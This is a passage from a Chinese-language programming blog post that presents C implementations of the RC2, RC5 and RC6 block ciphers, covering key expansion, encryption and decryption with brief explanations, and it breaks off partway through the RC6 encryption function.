&lt;&lt; <span class="number">1</span>) + (x10 &gt;&gt; <span class="number">15</span> &amp; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">2</span>) + (x32 &gt;&gt; <span class="number">14</span> &amp; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">3</span>) + (x54 &gt;&gt; <span class="number">13</span> &amp; <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">5</span>) + (x76 &gt;&gt; <span class="number">11</span> &amp; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span> || i == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x10 += xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 += xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 += xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x76 += xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x10;</span><br><span class="line">    cipher[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x32;</span><br><span class="line">    cipher[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">4</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x54;</span><br><span class="line">    cipher[<span class="number">5</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">6</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x76;</span><br><span class="line">    cipher[<span class="number">7</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密操作即为加密操作的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line"></span><br><span class="line">    x76 = (cipher[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">6</span>];</span><br><span class="line">    x54 = (cipher[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">4</span>];</span><br><span class="line">    x32 = (cipher[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">2</span>];</span><br><span class="line">    x10 = (cipher[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    i = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] ror s[i];</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] - K[j] - (R[i-1] &amp; R[i-2]) - ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j - 1;</span></span><br><span class="line">        x76 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">11</span>) + (x76 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        x76 -= (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        x54 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">13</span>) + (x54 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        x54 -= (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        x32 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">14</span>) + (x32 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        x32 -= (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        x10 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x10 = (x10 &lt;&lt; <span class="number">15</span>) + (x10 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        x10 -= (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// R[i] = R[i] - K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span> || i == <span class="number">11</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x76 -= xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 -= xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 -= xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x10 -= xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i--);</span><br><span class="line"></span><br><span class="line">    plain[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x10;</span><br><span class="line">    plain[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x32;</span><br><span class="line">    plain[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">4</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x54;</span><br><span class="line">    plain[<span class="number">5</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">6</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x76;</span><br><span class="line">    plain[<span class="number">7</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a><a href="https://en.wikipedia.org/wiki/RC5" target="_blank" rel="noopener">RC5</a></h1><p>RC5 同样也是分组密码，它支持可变的分组大小(32、64 或 128 比特)，密钥长度（0 至 2040 位）和加密轮数（0 ～ 255）。RC5 中有几个参数，w 代表一个字的字节大小，RC5 是以一个字为单位来进行所有操作的；r 代表加密轮数；b 代表密钥的长度。RC5 常用的 w 通常为 16、32 和 64。下面实现的是 w 为 32 时的 RC5 算法。</p><p>RC5 和 RC2 类似，总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc5.png" alt="RC5 加密算法"></p><p>算法中需要一些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> WORD;           <span class="comment">/* Should be 32-bit = 4 bytes        */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> w 32                         <span class="comment">/* word size in bits                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r 12                         <span class="comment">/* number of rounds                  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> b 16                         <span class="comment">/* number of bytes in key            */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> c 4                          <span class="comment">/* number words in key               */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> t 26                         <span class="comment">/* size of table S = 2*(r+1) words   */</span></span></span><br><span class="line">WORD S[t];                           <span class="comment">/* expanded key table                */</span></span><br><span class="line">WORD P = <span class="number">0xb7e15163</span>, Q = <span class="number">0x9e3779b9</span>; <span class="comment">/* magic constants                   */</span></span><br><span class="line"><span class="comment">/* Rotation operators. x must be unsigned, to get logical right shift     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y) (((x) <span class="meta-string">&lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</span></span><br></pre></td></tr></table></figure><h2 id="密钥扩展算法-1"><a href="#密钥扩展算法-1" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展首先分别初始化 L 数组和 S 盒，随后通过 L 进行按字异或得到 S 盒。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *K)</span> <span class="comment">/* secret input ket K[0...b-1] */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD i, j, k, u = w / <span class="number">8</span>, A, B, L[c];</span><br><span class="line">    <span class="comment">/* Initialize L, then S, then mix key into S */</span></span><br><span class="line">    <span class="keyword">for</span> (i = b - <span class="number">1</span>, L[c - <span class="number">1</span>] = <span class="number">0</span>; i != <span class="number">-1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        L[i / u] = (L[i / u] &lt;&lt; <span class="number">8</span>) + K[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (S[<span class="number">0</span>] = P, i = <span class="number">1</span>; i &lt; t; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[i] = S[i - <span class="number">1</span>] + Q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (A = B = i = j = k = <span class="number">0</span>; k &lt; <span class="number">3</span> * t; k++, i = (i + <span class="number">1</span>) % t, j = (j + <span class="number">1</span>) % c) <span class="comment">/* 3*t &gt; 3*c */</span></span><br><span class="line">    &#123;</span><br><span class="line">        A = S[i] = ROTL(S[i] + (A + B), <span class="number">3</span>);</span><br><span class="line">        B = L[j] = ROTL(L[j] + (A + B), (A + B));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法-1"><a href="#加密算法-1" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密涉及的一个简单轮函数的加密。基于安全需要和时间方面的考虑，建议 12 或 20 轮加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span> <span class="comment">/* 2 WORD input pt/output ct */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">2</span>], ct[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pt[i] = plain[<span class="number">4</span> * i] + (plain[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (plain[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (plain[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A = pt[<span class="number">0</span>] + S[<span class="number">0</span>], B = pt[<span class="number">1</span>] + S[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= r; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = ROTL(A ^ B, B) + S[<span class="number">2</span> * i];</span><br><span class="line">        B = ROTL(B ^ A, A) + S[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ct[<span class="number">0</span>] = A;</span><br><span class="line">    ct[<span class="number">1</span>] = B;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[<span class="number">4</span> * i] = ct[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">1</span>] = (ct[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">2</span>] = (ct[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">3</span>] = (ct[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法-1"><a href="#解密算法-1" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密实际上就是加密过程的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher, <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain)</span> <span class="comment">/* 2 WORD input ct/output pt */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">2</span>], ct[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ct[i] = cipher[<span class="number">4</span> * i] + (cipher[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (cipher[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (cipher[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WORD B = ct[<span class="number">1</span>], A = ct[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = r; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        B = ROTR(B - S[<span class="number">2</span> * i + <span class="number">1</span>], A) ^ A;</span><br><span class="line">        A = ROTR(A - S[<span class="number">2</span> * i], B) ^ B;</span><br><span class="line">    &#125;</span><br><span class="line">    pt[<span class="number">1</span>] = B - S[<span class="number">1</span>];</span><br><span class="line">    pt[<span class="number">0</span>] = A - S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plain[<span class="number">4</span> * i] = pt[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">1</span>] = (pt[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">2</span>] = (pt[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">3</span>] = (pt[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="RC6"><a href="#RC6" class="headerlink" title="RC6"></a><a href="https://en.wikipedia.org/wiki/RC6" target="_blank" rel="noopener">RC6</a></h1><p>RC6 是一个从 RC5 派生而来的对称分组加密算法，用以满足高级加密标准（AES）竞赛的要求。RC6 拥有 128 位的块大小，支持 128、192、256 位乃至 2040 位的密钥长度。像 RC5 一样，RC6 是可以被参数化的。它也因而支持变长的分组大小、密钥长度以及加密轮数。RC6 和 RC5 在结构、使用基于数据的置换规则、取模加法以及异或操作等很多方面都很相似。事实上，RC6 可以被看做是交织的两组平行的 RC5 加密。其中，RC6 使用了乘法运算，能够让置换基于字中每一位，而不是其中的几位。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc6.jpeg" alt="RC6 加密算法"></p><p>算法中需要一些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> WORD;           <span class="comment">/* Should be 32-bit = 4 bytes        */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> w 32                         <span class="comment">/* word size in bits                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r 20                         <span class="comment">/* based on security estimates       */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bytes (w / 8)                <span class="comment">/* bytes per word                    */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> c ((b + bytes - 1) / bytes)  <span class="comment">/* key in words, rounded up          */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R24 (2 * r + 4)              <span class="comment">/* length of array S                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lgw 5                        <span class="comment">/* log2(w) -- wussed out             */</span></span></span><br><span class="line">WORD S[R24 - <span class="number">1</span>];                     <span class="comment">/* Key schedule                      */</span></span><br><span class="line">WORD P = <span class="number">0xb7e15163</span>, Q = <span class="number">0x9e3779b9</span>; <span class="comment">/* magic constants                   */</span></span><br><span class="line"><span class="comment">/* Rotation operators. x must be unsigned, to get logical right shift     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y) (((x) <span class="meta-string">&lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</span></span><br></pre></td></tr></table></figure><h2 id="密钥扩展算法-2"><a href="#密钥扩展算法-2" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>RC6 中接受的密钥长度相比于 RC5 更长，生成的 S 盒大小为 2r+4。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *K, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, s, v;</span><br><span class="line">    WORD L[(<span class="number">32</span> + bytes - <span class="number">1</span>) / bytes]; <span class="comment">/* Big enough for max b */</span></span><br><span class="line">    WORD A, B;</span><br><span class="line"></span><br><span class="line">    L[c - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = b - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        L[i / bytes] = (L[i / bytes] &lt;&lt; <span class="number">8</span>) + K[i];</span><br><span class="line"></span><br><span class="line">    S[<span class="number">0</span>] = P;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * r + <span class="number">3</span>; i++)</span><br><span class="line">        S[i] = S[i - <span class="number">1</span>] + Q;</span><br><span class="line"></span><br><span class="line">    A = B = i = j = <span class="number">0</span>;</span><br><span class="line">    v = R24;</span><br><span class="line">    <span class="keyword">if</span> (c &gt; v)</span><br><span class="line">        v = c;</span><br><span class="line">    v *= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (s = <span class="number">1</span>; s &lt;= v; s++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = S[i] = ROTL(S[i] + A + B, <span class="number">3</span>);</span><br><span class="line">        B = L[j] = ROTL(L[j] + A + B, A + B);</span><br><span class="line">        i = (i + <span class="number">1</span>) % R24;</span><br><span class="line">        j = (j + <span class="number">1</span>) % c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法-2"><a href="#加密算法-2" class="headerlink" title="加密算法"></a>加密算法</h2><p>RC6 加密时比 RC5 多了乘法运算，加密过程也变得更复杂。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">4</span>], ct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pt[i] = plain[<span class="number">4</span> * i] + (plain[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (plain[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (plain[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A, B, C, D, t, u, x;</span><br><span class="line"></span><br><span class="line">    A = pt[<span class="number">0</span>];</span><br><span class="line">    B = pt[<span class="number">1</span>];</span><br><span class="line">    C = pt[<span class="number">2</span>];</span><br><span class="line">    D = pt[<span class="number">3</span>];</span><br><span class="line">    B += S[<span class="number">0</span>];</span><br><span class="line">    D += S[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">2</span> * r; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        t = ROTL(B * (<span class="number">2</span> * B + <span class="number">1</span>), lgw);</span><br><span class="line">        u = ROTL(D * (<span class="number">2</span> * D + <span class="number">1</span>), lgw);</span><br><span class="line">        A = ROTL(A ^ t, u) + S[i];</span><br><span class="line">        C = ROTL(C ^ u, t) + S[i + <span class="number">1</span>];</span><br><span class="line">        x = A;</span><br><span class="line">        A = B;</span><br><span class="line">        B = C;</span><br><span class="line">        C = D;</span><br><span class="line">        D = x;</span><br><span class="line">    &#125;</span><br><span class="line">    A += S[<span class="number">2</span> * r + <span class="number">2</span>];</span><br><span class="line">    C += S[<span class="number">2</span> * r + <span class="number">3</span>];</span><br><span class="line">    ct[<span class="number">0</span>] = A;</span><br><span class="line">    ct[<span class="number">1</span>] = B;</span><br><span class="line">    ct[<span class="number">2</span>] = C;</span><br><span class="line">    ct[<span class="number">3</span>] = D;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[<span class="number">4</span> * i] = ct[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">1</span>] = (ct[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">2</span>] = (ct[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">3</span>] = 